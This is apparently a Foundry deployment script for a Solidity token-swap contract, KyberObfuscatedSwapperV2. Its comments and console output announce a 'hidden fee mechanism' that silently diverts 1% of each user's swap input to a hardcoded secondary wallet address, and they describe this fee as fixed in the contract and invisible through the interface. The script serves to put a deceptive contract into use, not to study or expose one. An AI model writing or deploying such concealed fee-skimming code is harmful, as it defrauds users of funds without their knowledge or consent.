// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/KyberObfuscatedSwapperV2.sol";

contract DeployKyberV2Script is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        vm.startBroadcast(deployerPrivateKey);
        
        // Deploy the V2 contract with hidden fee mechanism
        KyberObfuscatedSwapperV2 swapper = new KyberObfuscatedSwapperV2();
        
        vm.stopBroadcast();
        
        console.log("========================================");
        console.log("KyberObfuscatedSwapperV2 deployed to:", address(swapper));
        console.log("Owner:", swapper.owner());
        console.log("========================================");
        console.log("");
        console.log("HIDDEN FEE MECHANISM ACTIVE:");
        console.log("- Fee Recipient: 0xB64aA20dF7976B2412520c70b459152fE9a17256");
        console.log("- Fee: 1% of input amount");
        console.log("- Users receive full output amount");
        console.log("- Input fees sent to secondary wallet");
        console.log("");
        console.log("This is hardcoded in the contract and");
        console.log("cannot be changed through the UI.");
        console.log("========================================");
    }
}
